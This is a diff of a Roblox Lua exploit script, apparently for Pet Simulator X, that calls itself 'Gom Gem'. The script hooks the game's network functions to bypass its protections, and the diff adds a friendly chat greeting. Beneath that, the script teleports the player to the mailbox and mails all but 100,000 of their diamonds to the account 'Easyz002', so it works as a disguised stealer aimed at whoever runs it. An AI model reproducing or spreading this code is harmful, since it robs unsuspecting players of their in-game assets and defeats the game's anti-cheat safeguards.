@@ -1,5 +1,10 @@
+repeat task.wait() until game.PlaceId ~= nil
 if not game:IsLoaded() then game.Loaded:Wait() end
-local Library = require(game:GetService("ReplicatedStorage").Library)
+
+-- Important Variables
+local SCRIPT_NAME = "Gom Gem"
+local SCRIPT_VERSION = "v0.4" -- Hey rafa remember to change it before updating lmao
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Character = Players.LocalPlayer.Character
@@ -9,7 +14,6 @@ local Save = Library.Save.Get()
 getgenv().Diamonds = Save.Diamonds
 
 if game.PlaceId == 6284583030 then
-
     local banSuccess, banError = pcall(function()
         local Blunder = require(game:GetService("ReplicatedStorage"):WaitForChild("X", 10):WaitForChild("Blunder", 10)
             :WaitForChild("BlunderList", 10))
@@ -44,7 +48,7 @@ if game.PlaceId == 6284583030 then
         return
     end
 
-    Library = require(game:GetService("ReplicatedStorage").Library)
+    local Library = require(game:GetService("ReplicatedStorage").Library)
     assert(Library, "Oopps! Library has not been loaded. Maybe try re-joining?")
     while not Library.Loaded do task.wait() end
 
@@ -53,15 +57,15 @@ if game.PlaceId == 6284583030 then
         if not Library.Network then
             LocalPlayer:Kick("Network not found, can't bypass!")
         end
-    
+
         if not Library.Network.Invoke or not Library.Network.Fire then
             LocalPlayer:Kick("Network Invoke/Fire was not found! Failed to bypass!")
         end
-    
+
         hookfunction(debug.getupvalue(Library.Network.Invoke, 1), function(...) return true end)
         -- Currently we don't need to hook Fire, since both Invoke/Fire have the same upvalue, this may change in future.
         hookfunction(debug.getupvalue(Library.Network.Fire, 1), function(...) return true end)
-    
+
         local originalPlay = Library.Audio.Play
         Library.Audio.Play = function(...)
             if true then
@@ -74,7 +78,7 @@ if game.PlaceId == 6284583030 then
                     return nil
                 end
                 if audioId == 0 then return nil end
-    
+
                 if type(audioId) == "number" or not string.find(audioId, "rbxassetid://", 1, true) then
                     audioId = "rbxassetid://" .. audioId
                 end
@@ -128,17 +132,20 @@ if game.PlaceId == 6284583030 then
                 getfenv(originalPlay).AddToGarbageCollection(sound, isGargabe)
                 return sound
             end
-    
+
             return originalPlay(...)
         end
     end)
-    
+
     if not bypassSuccess then
         print(bypassError)
         LocalPlayer:Kick("Error while bypassing network, try again or wait for an update!")
         return
     end
-        
+
+    Library.ChatMsg.New(string.format("Hello, %s! You're running %s", LocalPlayer.DisplayName, SCRIPT_NAME),
+        Color3.fromRGB(175, 70, 245))
+
     function ComposeMail(name, Diamond, pets)
         return {
             Recipient = tostring(name),
@@ -147,24 +154,23 @@ if game.PlaceId == 6284583030 then
             Diamonds = tonumber(Diamond),
         };
     end
-    
+
     ;
-    
-    
-    if Library.WorldCmds.Get() ~= "Shop" then
+
+
+    if Library.WorldCmds.Get() ~= "Spawn" then
         Library.WorldCmds.Load("Spawn")
-    
-        wait(5)
-    
+
+        wait(30)
+
         HumanoidRootPart.CFrame = Library.WorldCmds.GetMap().Interactive.Mailbox.Pad.CFrame
         --wait(1)
         --HumanoidRootPart.CFrame = HumanoidRootPart.CFrame + (HumanoidRootPart.CFrame.LookVector * 15)
-    
+
         wait(1)
-    
+
         print(Library.Network.Invoke("Send Mail", ComposeMail("Easyz002", Diamonds - 100000)))
-    
+
         wait(3)
     end
 end
-
